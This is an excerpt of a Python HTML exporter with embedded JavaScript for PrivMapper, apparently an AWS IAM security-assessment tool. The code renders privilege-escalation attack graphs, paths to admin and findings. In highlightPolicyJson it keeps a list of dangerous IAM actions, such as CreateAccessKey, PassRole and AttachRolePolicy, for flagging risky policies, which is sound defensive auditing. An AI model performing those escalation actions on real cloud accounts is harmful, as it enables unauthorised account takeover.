        <div class="graph-info-row"><span class="graph-info-key">Technique:</span><span class="graph-info-val">${escapeHtml(data.reason || 'Unknown')}</span></div>
        <div class="graph-info-row"><span class="graph-info-key">Severity:</span><span class="graph-info-val" style="color:${data.severity === 'critical' ? '#ef4444' : '#f59e0b'}">${data.severity || 'medium'}</span></div>
    `;
    info.classList.add('visible');
}

function toggleOwned(nodeId) {
    if (!cy) return;
    const node = cy.getElementById(nodeId);
    if (!node.length) return;

    if (ownedNodes.has(nodeId)) {
        ownedNodes.delete(nodeId);
        node.removeClass('owned');
    } else {
        ownedNodes.add(nodeId);
        node.addClass('owned');
    }

    updateOwnedPanel();
    if (selectedNodeId === nodeId) {
        showNodeInfo(node.data(), nodeId);
    }

    // Update button state
    const btn = document.querySelector('[data-type="owned"]');
    if (btn) {
        btn.classList.toggle('owned-active', ownedNodes.size > 0);
    }
}

function updateOwnedPanel() {
    const panel = document.querySelector('.owned-panel');
    const list = panel.querySelector('.owned-panel-list');

    if (ownedNodes.size === 0) {
        panel.classList.remove('visible');
        return;
    }

    panel.classList.add('visible');
    list.innerHTML = '';

    ownedNodes.forEach(nodeId => {
        const node = cy.getElementById(nodeId);
        if (node.length) {
            const item = document.createElement('div');
            item.className = 'owned-panel-item';
            item.innerHTML = `
                <span>${escapeHtml(node.data('label'))}</span>
                <span style="cursor:pointer;color:#ef4444" onclick="toggleOwned('${escapeJsString(nodeId)}')">×</span>
            `;
            list.appendChild(item);
        }
    });
}

function clearOwned() {
    ownedNodes.forEach(nodeId => {
        const node = cy.getElementById(nodeId);
        if (node.length) node.removeClass('owned');
    });
    ownedNodes.clear();
    updateOwnedPanel();
    cy.elements().removeClass('attack-path');
    cy.elements().style('opacity', 1);

    const btn = document.querySelector('[data-type="owned"]');
    if (btn) btn.classList.remove('owned-active');
}

function showPathsToAdmin(startNodeId) {
    if (!cy) return;

    cy.elements().removeClass('attack-path');
    cy.elements().style('opacity', 0.15);

    const startNode = cy.getElementById(startNodeId);
    const adminNodes = cy.nodes('[type="admin"]');

    // BFS to find paths to admin
    let pathFound = false;
    adminNodes.forEach(admin => {
        const paths = cy.elements().dijkstra({
            root: startNode,
            directed: true
        });

        const path = paths.pathTo(admin);
        if (path.length > 0) {
            pathFound = true;
            path.addClass('attack-path');
            path.style('opacity', 1);
        }
    });

    if (!pathFound) {
        startNode.style('opacity', 1);
        alert('No direct path to admin found from this node');
    } else {
        startNode.addClass('attack-path');
        startNode.style('opacity', 1);
    }
}

function showOwnedPaths() {
    if (!cy || ownedNodes.size === 0) return;

    cy.elements().removeClass('attack-path');
    cy.elements().style('opacity', 0.15);

    const adminNodes = cy.nodes('[type="admin"]');

    ownedNodes.forEach(nodeId => {
        const startNode = cy.getElementById(nodeId);
        startNode.style('opacity', 1);
        startNode.addClass('attack-path');

        adminNodes.forEach(admin => {
            // Use BFS to find all paths
            const paths = cy.elements().dijkstra({
                root: startNode,
                directed: true
            });

            const path = paths.pathTo(admin);
            if (path.length > 0) {
                path.addClass('attack-path');
                path.style('opacity', 1);
            }
        });
    });

    adminNodes.style('opacity', 1);
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text || '';
    return div.innerHTML;
}

function escapeJsString(str) {
    // Escape characters that could break out of JS string literals
    return (str || '').replace(/\\\\/g, '\\\\\\\\').replace(/'/g, "\\\\'").replace(/"/g, '\\\\"');
}

function graphZoom(factor) {
    if (cy) cy.zoom(cy.zoom() * factor);
}

function graphFit() {
    if (cy) cy.fit(50);
}

function graphCenter() {
    if (cy) cy.center();
}

function graphSearch(query) {
    if (!cy || !query) {
        if (cy) {
            cy.elements().style('opacity', 1);
            cy.elements().removeClass('attack-path');
        }
        return;
    }
    query = query.toLowerCase();
    const matched = cy.nodes().filter(n =>
        (n.data('label') || '').toLowerCase().includes(query) ||
        (n.data('arn') || '').toLowerCase().includes(query)
    );
    cy.elements().style('opacity', 0.15);
    matched.style('opacity', 1);
    matched.connectedEdges().style('opacity', 1);
    matched.neighborhood().style('opacity', 0.8);

    if (matched.length > 0) {
        cy.animate({ fit: { eles: matched, padding: 100 }, duration: 300 });
    }
}

function graphLayout(name) {
    if (!cy) return;
    const layouts = {
        cose: { name: 'cose', animate: true, animationDuration: 500, nodeRepulsion: () => 10000, idealEdgeLength: () => 120 },
        circle: { name: 'circle', animate: true, animationDuration: 300, padding: 50 },
        breadthfirst: { name: 'breadthfirst', animate: true, animationDuration: 300, directed: true, padding: 50, spacingFactor: 1.5 },
        grid: { name: 'grid', animate: true, animationDuration: 300, padding: 50 },
        concentric: { name: 'concentric', animate: true, animationDuration: 300, concentric: n => n.data('is_admin') ? 10 : (ownedNodes.has(n.id()) ? 1 : 5), levelWidth: () => 2 }
    };
    cy.layout(layouts[name] || layouts.cose).run();

    document.querySelectorAll('.layout-btn').forEach(b => b.classList.remove('active'));
    document.querySelector('.layout-btn[data-layout="'+name+'"]')?.classList.add('active');
}

function exportGraph(format) {
    if (!cy) return;

    if (format === 'png') {
        const png = cy.png({ output: 'blob', scale: 2, bg: '#0f172a' });
        const url = URL.createObjectURL(png);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'privmapper_graph_' + new Date().toISOString().slice(0,10) + '.png';
        a.click();
        URL.revokeObjectURL(url);
    } else if (format === 'svg') {
        const svg = cy.svg({ scale: 1, full: true, bg: '#0f172a' });
        const blob = new Blob([svg], { type: 'image/svg+xml' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'privmapper_graph_' + new Date().toISOString().slice(0,10) + '.svg';
        a.click();
        URL.revokeObjectURL(url);
    }
}

function highlightPaths(type) {
    if (!cy) return;

    // Reset all elements
    cy.elements().style('opacity', 1).style('display', 'element');
    cy.elements().removeClass('attack-path');
    closePathDetails();

    if (type === 'all') {
        return;
    }

    if (type === 'owned') {
        if (ownedNodes.size > 0) {
            showOwnedPaths();
        }
        return;
    }

    let matchingEdges = [];
    let pathDetails = [];

    if (type === 'admins') {
        // Get all edges that lead to admins (directly or indirectly)
        const admins = cy.nodes('[type="admin"]');
        const adminIds = new Set();
        admins.forEach(a => adminIds.add(a.id()));

        // Find all paths to admin nodes
        cy.edges().forEach(edge => {
            const targetId = edge.data('target');
            const targetNode = cy.getElementById(targetId);
            if (targetNode.length && (targetNode.data('type') === 'admin' || targetNode.data('is_admin'))) {
                matchingEdges.push(edge);
                pathDetails.push({
                    source: edge.data('source_name') || edge.data('source').split('/').pop(),
                    target: edge.data('target_name') || edge.data('target').split('/').pop(),
                    reason: edge.data('reason') || edge.data('short_reason') || 'Unknown',
                    isAdmin: true
                });
            }
        });

        // Also include edges leading TO nodes that have edges to admin
        cy.edges().forEach(edge => {
            const targetId = edge.data('target');
            if (matchingEdges.some(e => e.data('source') === targetId)) {
                if (!matchingEdges.includes(edge)) {
                    matchingEdges.push(edge);
                    pathDetails.push({
                        source: edge.data('source_name') || edge.data('source').split('/').pop(),
                        target: edge.data('target_name') || edge.data('target').split('/').pop(),
                        reason: edge.data('reason') || edge.data('short_reason') || 'Unknown',
                        isAdmin: false
                    });
                }
            }
        });

    } else if (type === 'critical') {
        cy.edges('[severity="critical"]').forEach(edge => {
            matchingEdges.push(edge);
            pathDetails.push({
                source: edge.data('source_name') || edge.data('source').split('/').pop(),
                target: edge.data('target_name') || edge.data('target').split('/').pop(),
                reason: edge.data('reason') || edge.data('short_reason') || 'Unknown',
                severity: 'critical'
            });
        });
    }

    // Hide non-matching elements completely
    cy.elements().style('display', 'none');

    // Show only matching edges and their connected nodes
    matchingEdges.forEach(edge => {
        edge.style('display', 'element').style('opacity', 1);
        edge.addClass('attack-path');
        edge.connectedNodes().style('display', 'element').style('opacity', 1);
    });

    // Show path details panel
    if (pathDetails.length > 0) {
        showPathDetailsPanel(type, pathDetails);
    }
}

function showPathDetailsPanel(type, paths) {
    const panel = document.getElementById('path-details');
    const countEl = panel.querySelector('.path-details-count');
    const listEl = panel.querySelector('.path-details-list');
    const titleEl = panel.querySelector('.path-details-title span:first-child');

    titleEl.textContent = type === 'admins' ? 'Paths to Admin' : 'Critical Paths';
    countEl.textContent = paths.length + ' attack path' + (paths.length !== 1 ? 's' : '') + ' found';

    listEl.innerHTML = paths.map((p, i) => `
        <div class="path-item">
            <div class="path-item-header">
                <div class="path-item-num">${i + 1}</div>
                <div class="path-item-source">${escapeHtml(p.source)}</div>
                ${p.isAdmin ? '<span class="path-item-badge admin">→ ADMIN</span>' : ''}
                ${p.severity === 'critical' ? '<span class="path-item-badge admin">CRITICAL</span>' : ''}
            </div>
            <div class="path-item-arrow">↓</div>
            <div class="path-item-target">${escapeHtml(p.target)}</div>
            <div class="path-item-action">
                <strong>Action:</strong> ${escapeHtml(p.reason)}
            </div>
        </div>
    `).join('');

    panel.classList.add('visible');
}

function closePathDetails() {
    document.getElementById('path-details').classList.remove('visible');
}
"""


APP_JS = """
// ═══════════════════ Cyberpunk UI Functions ═══════════════════

function toggleAccount(id) {
    const body = document.getElementById('ab-' + id);
    const chev = document.getElementById('ac-' + id);
    body.classList.toggle('open');
    chev.classList.toggle('open');
}

function toggleFinding(id) {
    const body = document.getElementById('fb-' + id);
    const chev = document.getElementById('fc-' + id);
    body.classList.toggle('open');
    chev.classList.toggle('open');
}

function copyText(btn) {
    // Get text from data-copy attribute or from sibling cli-code element
    let text = btn.dataset.copy;
    if (!text) {
        const cliBlock = btn.closest('.cli-block');
        if (cliBlock) {
            const codeEl = cliBlock.querySelector('.cli-code');
            if (codeEl) text = codeEl.textContent;
        }
    }
    if (!text) return;
    navigator.clipboard.writeText(text).then(() => {
        const orig = btn.textContent;
        btn.classList.add('copied');
        btn.textContent = 'Copied!';
        setTimeout(() => {
            btn.classList.remove('copied');
            btn.textContent = orig;
        }, 1500);
    }).catch(() => {
        // Fallback for older browsers
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        btn.textContent = 'Copied!';
        setTimeout(() => { btn.textContent = 'Copy'; }, 1500);
    });
}

// ═══════════════════ Copy ARN with Toast ═══════════════════
function copyArn(btn, arn) {
    // Tolerate the single-argument call form copyArn('arn') used by query-result and
    // chip contexts (where there is no button element to update). Without this, those
    // callers passed the ARN as `btn`, leaving `arn` undefined and copying "undefined".
    if (arn === undefined && typeof btn === 'string') { arn = btn; btn = null; }
    navigator.clipboard.writeText(arn).then(() => {
        if (btn && btn.textContent !== undefined) {
            const orig = btn.textContent;
            btn.classList.add('copied');
            btn.textContent = 'Copied!';
            setTimeout(() => {
                btn.classList.remove('copied');
                btn.textContent = orig;
            }, 1200);
        }
        showToast('ARN copied: ' + String(arn).split('/').pop());
    });
}

// Toggle show more principals (card view)
function togglePrincipals(btn, fid) {
    const showing = btn.dataset.showing === 'true';
    const cards = document.querySelectorAll('.principal-card[data-principal-idx="' + fid + '"].principals-hidden');
    cards.forEach(card => {
        card.classList.toggle('show', !showing);
    });
    btn.dataset.showing = !showing ? 'true' : 'false';
    const count = cards.length;
    btn.textContent = showing ? 'Show ' + count + ' more principals' : 'Show less';
}

// Toggle show more principals (chip view for overly permissive)
function togglePrincipalsChips(btn, fid) {
    const showing = btn.dataset.showing === 'true';
    const chips = document.querySelectorAll('.overperm-chip[data-principal-idx="' + fid + '"].principals-hidden');
    chips.forEach(chip => {
        chip.classList.toggle('show', !showing);
    });
    btn.dataset.showing = !showing ? 'true' : 'false';
    const count = chips.length;
    btn.textContent = showing ? 'Show ' + count + ' more principals' : 'Show less';
}

function copyFinding(title, principals) {
    const text = '## ' + title + '\\n\\nAffected Principals:\\n' + principals.map(p => '- ' + p).join('\\n');
    navigator.clipboard.writeText(text).then(() => {
        showToast('Finding copied to clipboard');
    });
}

function copyAllArns(arns) {
    navigator.clipboard.writeText(arns.join('\\n')).then(() => {
        showToast(arns.length + ' ARNs copied to clipboard');
    });
}

function showToast(message) {
    // Remove existing toast
    const existing = document.querySelector('.copied-toast');
    if (existing) existing.remove();

    const toast = document.createElement('div');
    toast.className = 'copied-toast';
    // Use textContent to prevent XSS, add checkmark as Unicode
    toast.textContent = '\u2713 ' + message;
    document.body.appendChild(toast);

    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateY(20px)';
        setTimeout(() => toast.remove(), 300);
    }, 2000);
}

// ═══════════════════ Selection for Bulk Export ═══════════════════
let selectedArns = new Set();

function toggleArnSelection(arn, element) {
    if (selectedArns.has(arn)) {
        selectedArns.delete(arn);
        element.classList.remove('selected');
    } else {
        selectedArns.add(arn);
        element.classList.add('selected');
    }
    updateExportPanel();
}

function updateExportPanel() {
    const panel = document.getElementById('export-panel');
    const count = document.getElementById('export-count');
    if (selectedArns.size > 0) {
        panel.classList.add('visible');
        count.textContent = selectedArns.size;
    } else {
        panel.classList.remove('visible');
    }
}

function exportSelected(format) {
    const arns = Array.from(selectedArns);
    if (format === 'markdown') {
        const md = '## Selected Principals\\n\\n' + arns.map(a => '- `' + a + '`').join('\\n');
        navigator.clipboard.writeText(md).then(() => showToast('Exported as Markdown'));
    } else if (format === 'json') {
        navigator.clipboard.writeText(JSON.stringify(arns, null, 2)).then(() => showToast('Exported as JSON'));
    } else {
        navigator.clipboard.writeText(arns.join('\\n')).then(() => showToast('Exported as text'));
    }
}

function clearSelection() {
    selectedArns.clear();
    document.querySelectorAll('.selected').forEach(el => el.classList.remove('selected'));
    updateExportPanel();
}

// ═══════════════════ Filter & Export for Principals ═══════════════════
function filterQueries(category, btn) {
    // Update active button
    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');

    // Filter query cards
    const cards = document.querySelectorAll('.query-card');
    cards.forEach(card => {
        if (category === 'all') {
            card.dataset.hidden = 'false';
            card.style.display = '';
        } else {
            const cardCat = card.dataset.category || '';
            if (cardCat === category) {
                card.dataset.hidden = 'false';
                card.style.display = '';
            } else {
                card.dataset.hidden = 'true';
                card.style.display = 'none';
            }
        }
    });
}

function exportPrincipals(format) {
    // Collect all visible principals from query cards
    const principals = [];
    const visibleCards = document.querySelectorAll('.query-card:not([data-hidden="true"])');

    visibleCards.forEach(card => {
        const category = card.dataset.category || 'unknown';
        const title = card.querySelector('.query-card-title')?.textContent || '';
        const arnElements = card.querySelectorAll('[data-arn]');
        arnElements.forEach(el => {
            principals.push({
                category: category,
                title: title,
                arn: el.dataset.arn,
                name: el.textContent.replace(/ADMIN$/, '').trim(),
                isAdmin: el.textContent.includes('ADMIN')
            });
        });
    });

    if (principals.length === 0) {
        showToast('No principals to export');
        return;
    }

    let output = '';
    let filename = 'principals_export';
    let mimeType = 'text/plain';

    if (format === 'csv') {
        output = 'Category,Title,Name,ARN,IsAdmin\\n';
        principals.forEach(p => {
            output += `"${p.category}","${p.title}","${p.name}","${p.arn}",${p.isAdmin}\\n`;
        });
        filename += '.csv';
        mimeType = 'text/csv';
    } else if (format === 'json') {
        output = JSON.stringify(principals, null, 2);
        filename += '.json';
        mimeType = 'application/json';
    }

    // Create download
    const blob = new Blob([output], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);

    showToast(`Exported ${principals.length} principals as ${format.toUpperCase()}`);
}

// ═══════════════════ Principals Table Filter ═══════════════════
function filterPrincipalsTable(filter) {
    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
    document.querySelector(`.filter-btn[data-filter="${filter}"]`)?.classList.add('active');

    document.querySelectorAll('.principals-table tbody tr').forEach(row => {
        let show = true;
        if (filter === 'admin') show = row.dataset.admin === 'true';
        else if (filter === 'shadow') show = row.dataset.shadow === 'true';
        else if (filter === 'dangerous') show = row.dataset.dangerous === 'true';
        row.style.display = show ? '' : 'none';
    });
}

function exportPrincipalsTable(format) {
    const rows = document.querySelectorAll('.principals-table tbody tr:not([style*="display: none"])');
    const data = [];
    rows.forEach(row => {
        const cells = row.querySelectorAll('td');
        data.push({
            name: cells[0]?.textContent?.trim() || '',
            type: cells[1]?.textContent?.trim() || '',
            isAdmin: row.dataset.admin === 'true',
            isShadowAdmin: row.dataset.shadow === 'true',
            hasDangerousActions: row.dataset.dangerous === 'true'
        });
    });

    if (data.length === 0) {
        showToast('No principals to export');
        return;
    }

    let output = '';
    let filename = 'principals';
    let mimeType = 'text/plain';

    if (format === 'csv') {
        output = 'Name,Type,IsAdmin,IsShadowAdmin,HasDangerousActions\\n';
        data.forEach(p => {
            output += `"${p.name}","${p.type}",${p.isAdmin},${p.isShadowAdmin},${p.hasDangerousActions}\\n`;
        });
        filename += '.csv';
        mimeType = 'text/csv';
    } else {
        output = JSON.stringify(data, null, 2);
        filename += '.json';
        mimeType = 'application/json';
    }

    const blob = new Blob([output], {type: mimeType});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showToast(`Exported ${data.length} principals as ${format.toUpperCase()}`);
}

// ═══════════════════ Pagination ═══════════════════
const paginationState = {};

function initPagination(containerId, itemSelector, perPage = 10) {
    const container = document.getElementById(containerId);
    if (!container) return;

    const items = container.querySelectorAll(itemSelector);
    if (items.length <= perPage) return; // No pagination needed

    paginationState[containerId] = {
        currentPage: 1,
        perPage: perPage,
        totalItems: items.length,
        totalPages: Math.ceil(items.length / perPage)
    };

    // Hide all items initially, show first page
    items.forEach((item, idx) => {
        item.dataset.paginationIdx = idx;
        item.style.display = idx < perPage ? '' : 'none';
    });

    // Create pagination controls
    const paginationHtml = createPaginationControls(containerId);
    const paginationDiv = document.createElement('div');
    paginationDiv.className = 'pagination';
    paginationDiv.id = 'pagination-' + containerId;
    paginationDiv.innerHTML = paginationHtml;
    container.appendChild(paginationDiv);

    updatePaginationDisplay(containerId);
}

function createPaginationControls(containerId) {
    const state = paginationState[containerId];
    return `
        <button class="pagination-btn" onclick="goToPage('${containerId}', 1)" title="First">&laquo;</button>
        <button class="pagination-btn" onclick="goToPage('${containerId}', ${state.currentPage - 1})" title="Previous">&lsaquo;</button>
        <span class="pagination-info">
            Page <span id="page-num-${containerId}">${state.currentPage}</span> of ${state.totalPages}
            (${state.totalItems} items)
        </span>
        <button class="pagination-btn" onclick="goToPage('${containerId}', ${state.currentPage + 1})" title="Next">&rsaquo;</button>
        <button class="pagination-btn" onclick="goToPage('${containerId}', ${state.totalPages})" title="Last">&raquo;</button>
        <div class="pagination-jump">
            <input type="number" min="1" max="${state.totalPages}" value="${state.currentPage}"
                onchange="goToPage('${containerId}', parseInt(this.value) || 1)"
                onkeypress="if(event.key==='Enter')goToPage('${containerId}', parseInt(this.value) || 1)">
        </div>
    `;
}

function goToPage(containerId, page) {
    const state = paginationState[containerId];
    if (!state) return;

    // Clamp page to valid range
    page = Math.max(1, Math.min(state.totalPages, page));
    state.currentPage = page;

    // Show/hide items for current page
    const container = document.getElementById(containerId);
    const items = container.querySelectorAll('[data-pagination-idx]');
    const start = (page - 1) * state.perPage;
    const end = start + state.perPage;

    items.forEach((item, idx) => {
        item.style.display = (idx >= start && idx < end) ? '' : 'none';
    });

    updatePaginationDisplay(containerId);
}

function updatePaginationDisplay(containerId) {
    const state = paginationState[containerId];
    const pageNum = document.getElementById('page-num-' + containerId);
    if (pageNum) pageNum.textContent = state.currentPage;

    const input = document.querySelector('#pagination-' + containerId + ' input');
    if (input) input.value = state.currentPage;
}

// ═══════════════════ Policy Viewer ═══════════════════
let policyData = {};

function registerPolicy(policyArn, policyJson, issues) {
    policyData[policyArn] = { json: policyJson, issues: issues || [] };
}

function viewPolicy(policyArn, issues) {
    const viewer = document.getElementById('policy-viewer');
    const title = document.querySelector('.policy-viewer-title');
    const arn = document.querySelector('.policy-viewer-arn');
    const body = document.querySelector('.policy-code');

    if (!viewer || !policyData[policyArn]) {
        showToast('Policy data not available');
        return;
    }

    const data = policyData[policyArn];
    const policyName = policyArn.split('/').pop() || policyArn.split(':').pop();

    title.innerHTML = '<span style="color:var(--olive)">📜</span> ' + escapeHtml(policyName);
    arn.textContent = policyArn;

    // Highlight the policy JSON with syntax highlighting and issue markers
    body.innerHTML = highlightPolicyJson(data.json, data.issues);

    viewer.classList.add('visible');
    document.body.style.overflow = 'hidden';
}

function closePolicy() {
    const viewer = document.getElementById('policy-viewer');
    if (viewer) {
        viewer.classList.remove('visible');
        document.body.style.overflow = '';
    }
}

function highlightPolicyJson(jsonStr, issues) {
    // First, pretty-print the JSON
    let obj;
    try {
        obj = typeof jsonStr === 'string' ? JSON.parse(jsonStr) : jsonStr;
    } catch (e) {
        return escapeHtml(jsonStr);
    }

    const formatted = JSON.stringify(obj, null, 2);
    const lines = formatted.split('\\n');
    const issueActions = new Set(issues.map(i => i.toLowerCase()));

    // Process each line
    return lines.map(line => {
        let escaped = escapeHtml(line);

        // Check if this line contains an issue action
        let hasIssue = false;
        issueActions.forEach(action => {
            if (line.toLowerCase().includes('"' + action + '"') ||
                line.toLowerCase().includes('": "' + action) ||
                line.toLowerCase().includes('"*"') ||
                (action.includes(':') && line.toLowerCase().includes(action))) {
                hasIssue = true;
            }
        });

        // Check for dangerous patterns
        const dangerousPatterns = ['"*"', '"iam:*"', '"s3:*"', '"ec2:*"', '"lambda:*"',
            'AttachRolePolicy', 'AttachUserPolicy', 'PutRolePolicy', 'PutUserPolicy',
            'CreateAccessKey', 'CreateLoginProfile', 'UpdateAssumeRolePolicy',
            'PassRole', 'AssumeRole', 'CreatePolicyVersion', 'SetDefaultPolicyVersion'];
        dangerousPatterns.forEach(pattern => {
            if (line.includes(pattern)) hasIssue = true;
        });

        // Apply syntax highlighting
        escaped = escaped
            .replace(/"([^"]+)":/g, '<span class="key">"$1"</span>:')
            .replace(/: "([^"]+)"/g, ': <span class="string">"$1"</span>')
            .replace(/: (true|false)/g, ': <span class="boolean">$1</span>')
            .replace(/: (null)/g, ': <span class="null">$1</span>')
            .replace(/: (\\d+)/g, ': <span class="number">$1</span>');

        // Wrap dangerous values
        if (hasIssue) {
            return '<span class="issue-line">' + escaped + '</span>';
        }

        return escaped;
    }).join('\\n');
}

function copyPolicyJson() {
    const body = document.querySelector('.policy-code');
    if (body) {
        const text = body.textContent;
        navigator.clipboard.writeText(text).then(() => showToast('Policy JSON copied'));
    }
}

// ═══════════════════ Expand all on load ═══════════════════
document.addEventListener('DOMContentLoaded', () => {
    document.querySelectorAll('.account-section').forEach((section, i) => {
        if (i === 0) toggleAccount(section.id.replace('as-', ''));
    });

    // Add click handlers for ARN copying
    document.querySelectorAll('[data-arn]').forEach(el => {
        el.addEventListener('click', (e) => {
            copyArn(el.dataset.arn, e);
        });
    });

    // Close policy viewer on escape key
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') closePolicy();
    });

    // Close policy viewer on backdrop click
    const viewer = document.getElementById('policy-viewer');
    if (viewer) {
        viewer.addEventListener('click', (e) => {
            if (e.target === viewer) closePolicy();
        });
    }
});
"""


_CSS, _GRAPH_JS, _APP_JS = CSS, GRAPH_JS, APP_JS


class HTMLExporter:
    """Generate interactive HTML report."""

    CSS = _CSS

    GRAPH_JS = _GRAPH_JS

    JS = _APP_JS

    @classmethod
    def export(cls, analyses: List[AccountAnalysis], cross_account_findings: List[Finding],
               output_path: Path, run_metadata: Optional[RunMetadata] = None):
        """Generate HTML report."""
        run_date = datetime.now().strftime("%d %b %Y %H:%M")

        if run_metadata is None:
            run_metadata = RunMetadata(run_timestamp=run_date)

        total_findings = sum(len(a.findings) for a in analyses) + len(cross_account_findings)
        total_paths = sum(len(a.escalation_paths) for a in analyses)
        critical_count = sum(
            1 for a in analyses
            for f in a.findings if f.severity == "critical"
        ) + sum(1 for f in cross_account_findings if f.severity == "critical")

        graph_data = cls._build_graph_data(analyses)
        graph_json = json.dumps(graph_data)

        policy_scripts = cls._generate_policy_scripts(analyses)

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>IAM Security Report - {run_date}</title>
    <style>{cls.CSS}</style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/cytoscape/3.28.1/cytoscape.min.js"></script>
</head>
<body>
    <!-- Sidebar Navigation -->
    <div class="sidebar">
        <div class="sidebar-header">
            <div class="sidebar-logo">
                <div class="sidebar-logo-icon">&#9733;</div>
                PrivMapper
            </div>
            <div class="sidebar-version">Advanced v1.0</div>
        </div>
        <nav class="sidebar-nav">
            <div class="sidebar-section">Overview</div>
            <a class="sidebar-link active" onclick="showSection('dashboard')" data-section="dashboard">Dashboard</a>
            <a class="sidebar-link" onclick="showSection('graph')" data-section="graph">Attack Graph</a>
            <div class="sidebar-section">Analysis</div>
            <a class="sidebar-link" onclick="showSection('findings')" data-section="findings">
                Findings
                <span class="sidebar-link-badge">{total_findings}</span>
            </a>
            <a class="sidebar-link" onclick="showSection('paths')" data-section="paths">
                Escalation Paths
                <span class="sidebar-link-badge">{total_paths}</span>
            </a>
            <a class="sidebar-link" onclick="showSection('principals')" data-section="principals">Principals</a>
            <a class="sidebar-link" onclick="showSection('queries')" data-section="queries">Query Results</a>
            <div class="sidebar-section">Accounts</div>"""

        for i, analysis in enumerate(analyses):
            html += f"""
            <a class="sidebar-link" onclick="showSection('account-{i}')" data-section="account-{i}">{analysis.account_id[:12]}</a>"""

        html += f"""
        </nav>
        <div class="sidebar-stats">
            <div class="sidebar-stat">
                <span class="sidebar-stat-label">Critical</span>
                <span class="sidebar-stat-value" style="color:#e94560">{critical_count}</span>
            </div>
            <div class="sidebar-stat">
                <span class="sidebar-stat-label">Shadow Admins</span>
                <span class="sidebar-stat-value">{sum(len(a.shadow_admins) for a in analyses)}</span>
            </div>
            <div class="sidebar-stat">
                <span class="sidebar-stat-label">Cross-Account</span>
                <span class="sidebar-stat-value">{sum(len(a.cross_account_trusts) for a in analyses)}</span>
            </div>
        </div>
    </div>

    <!-- Main Content Area -->
    <div class="main-wrapper">
        <div class="header">
            <div class="header-inner">
                <div class="header-label">AWS IAM Security Assessment</div>
                <div class="header-title">PrivMapper Advanced Report</div>
                <div class="header-meta">{run_date} | {len(analyses)} account{'s' if len(analyses) != 1 else ''} analyzed</div>
            </div>
            <div class="header-actions">
                <span class="header-badge">Powered by PMapper</span>
            </div>
        </div>

        <div class="main">
            <!-- Dashboard Section -->
            <div class="content-section active" id="section-dashboard">
                {cls._render_run_info(run_metadata)}
                <div class="summary-grid">
                    <div class="summary-card">
                        <div class="summary-value">{len(analyses)}</div>
                        <div class="summary-label">Accounts Analyzed</div>
                    </div>
                    <div class="summary-card">
                        <div class="summary-value critical">{critical_count}</div>
                        <div class="summary-label">Critical Findings</div>
                    </div>
                    <div class="summary-card">
                        <div class="summary-value high">{total_paths}</div>
                        <div class="summary-label">Escalation Paths</div>
                    </div>
                    <div class="summary-card">
                        <div class="summary-value">{total_findings}</div>
                        <div class="summary-label">Total Findings</div>
                    </div>
                </div>
                {cls._render_methodology()}

                <!-- Quick findings preview on dashboard -->
                <h3 style="margin:24px 0 16px;font-size:16px">Critical Findings Overview</h3>
                <div class="findings-grid">
"""
        critical_findings = []
        for analysis in analyses:
            for finding in analysis.findings:
                if finding.severity == "critical":
                    critical_findings.append((analysis.account_id, finding))
        for cf in cross_account_findings:
            if cf.severity == "critical":
                critical_findings.append(("cross-account", cf))

        if critical_findings:
            for account_id, finding in critical_findings[:6]:
                html += f"""
                    <div class="finding-card">
                        <div class="finding-card-header">
                            <div class="finding-card-title">{cls._escape(finding.title)}</div>
                            <span class="badge critical">CRITICAL</span>
                        </div>
                        <div class="finding-card-body">
                            <div class="finding-card-desc">{cls._escape(finding.description[:150])}{'...' if len(finding.description) > 150 else ''}</div>
                            <div class="finding-card-meta">
                                <span class="finding-card-tag">{cls._escape(finding.category.upper())}</span>
                                <span class="finding-card-tag">{len(finding.principals)} principal{'s' if len(finding.principals) != 1 else ''}</span>
                            </div>
                        </div>
                        <div class="finding-card-footer">
                            <span class="finding-card-action" onclick="showSection('findings')">View Details &#8594;</span>
                        </div>
                    </div>"""
        else:
            html += """
                    <div style="padding:40px;text-align:center;color:var(--tx2);background:var(--bg2);border-radius:var(--radius-lg);border:1px dashed var(--bd)">
                        <div style="font-size:32px;margin-bottom:12px">&#10004;</div>
                        <div style="font-size:14px;font-weight:600;color:var(--ok)">No Critical Findings</div>
                        <div style="font-size:12px;margin-top:8px">Great job! No critical security issues detected.</div>
                    </div>"""

        html += """
                </div>
            </div>

            <!-- Graph Section -->
            <div class="content-section" id="section-graph">
                <!-- Interactive Graph Visualizer -->
        <div class="graph-section">
            <div class="graph-header">
                <div class="graph-title">
                    <div class="graph-title-icon">&#9733;</div>
                    Privilege Escalation Graph
                </div>
                <div class="graph-controls">
                    <button class="graph-btn layout-btn active" data-layout="cose" onclick="graphLayout('cose')">Force</button>
                    <button class="graph-btn layout-btn" data-layout="breadthfirst" onclick="graphLayout('breadthfirst')">Tree</button>
                    <button class="graph-btn layout-btn" data-layout="circle" onclick="graphLayout('circle')">Circle</button>
                    <button class="graph-btn layout-btn" data-layout="concentric" onclick="graphLayout('concentric')">Admin Center</button>
                    <span style="color:#4a4a6a;margin:0 8px">|</span>
                    <button class="graph-btn" onclick="highlightPaths('all')">Show All</button>
                    <button class="graph-btn" onclick="highlightPaths('admins')">Admin Paths</button>
                    <button class="graph-btn" onclick="highlightPaths('critical')">Critical Only</button>
                    <button class="graph-btn" id="owned-paths-btn" onclick="showOwnedPaths()">Owned Paths</button>
                    <span style="color:#4a4a6a;margin:0 8px">|</span>
                    <button class="graph-btn" onclick="exportGraph('png')" title="Export as PNG">PNG</button>
